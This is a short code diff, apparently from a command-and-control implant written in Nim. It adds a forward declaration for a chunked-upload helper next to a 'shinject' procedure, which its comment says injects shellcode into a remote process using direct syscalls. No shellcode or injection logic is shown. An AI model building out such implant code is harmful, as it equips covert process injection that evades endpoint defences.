@@ -19,6 +19,11 @@ when defined(windows):
 
 const CHUNK_SIZE = 512000
 
+# Forward declaration
+proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string, 
+                          totalChunks: int, currentChunk: int, 
+                          fileData: var seq[byte]): JsonNode
+
 proc shinject*(taskId: string, params: JsonNode): JsonNode =
   ## Inject shellcode into a remote process using direct syscalls
   when not defined(windows):
